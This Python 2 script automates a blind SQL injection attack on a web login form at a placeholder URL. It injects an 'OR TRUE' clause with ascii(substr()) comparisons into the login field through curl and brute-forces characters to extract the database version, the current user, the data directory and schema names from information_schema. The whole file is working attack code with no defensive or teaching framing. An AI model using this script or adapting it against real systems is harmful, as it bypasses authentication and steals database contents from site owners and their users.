import subprocess
from time import sleep
def enum(min,max,tam,tocheck,query,trail=''):
	res = ''
	for idx in range(1,tam+1):
		for val in range(min,max+1):
			par=')'
			if len(trail) >0: par =''
			pay = 'AND (SELECT ascii(substr(%s, %s, 1))%s=%s' % (query,idx,par,val)
			pay+= trail
			#print 'pay => %s ' % pay
			#exit()
			cad = "accion=loginp&login=asd' OR TRUE %s -- -v&password=s" % pay
			baseurl = 'http://domain/resource/'
			out = subprocess.check_output(['curl','-s','--data',cad, baseurl+'resource2/file.php','-c','cookie'])
			out = subprocess.check_output(['curl','-s','-b','cookie',baseurl])
			if check(out,tocheck):
				print '*'*5,'Found it [%s]=>[%s] => %s '%(idx,val,str(unichr(val)))
				res+=str(unichr(val))
				break
			else:print 'Trying %s at idx %s ' % (val,idx)
			sleep(0.2)
	return '%s => %s ' % (query,res)

def check(text,tocheck):
	if tocheck in text: return True
	return False

#(SELECT ascii(substr(schema_name,1,1)) > 10 FROM information_schema.schemata LIMIT 1);
res=[]
#res.append(enum(40,200,6,'Edit','@@version'))
#res.append(enum(80,200,14,'Edit','user()'))
#res.append(enum(40,200,15,'Edit','@@datadir'))
res.append(enum(40,200,18,'Edit','schema_name',' FROM information_schema.schemata LIMIT 1 OFFSET 1)'))
print '\n'.join(res)
